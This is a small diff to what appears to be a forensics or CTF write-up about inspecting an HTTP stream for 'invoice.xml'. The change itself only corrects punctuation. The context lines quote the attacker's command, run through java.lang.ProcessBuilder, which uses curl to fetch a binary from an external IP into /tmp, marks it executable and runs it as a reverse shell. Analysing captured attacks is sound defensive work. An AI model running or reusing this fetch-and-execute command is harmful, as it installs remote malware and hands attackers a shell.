@@ -86,7 +86,7 @@ So I followed the HTTP stream for `invoice.xml`.
 Inside the XML you can clearly see the command being built and executed through `java.lang.ProcessBuilder`.
 And there the important part is explicit: it runs `curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; ./tmp/docker`.
 
-That was enough to answer the question, because the dropped reverse shell executable is the file being downloaded to disk and then executed,.
+That was enough to answer the question, because the dropped reverse shell executable is the file being downloaded to disk and then executed.
 
 <img width="965" height="831" alt="immagine" src="https://github.com/user-attachments/assets/acf5c14d-db4f-41ef-8816-1982336a8baf" />
 
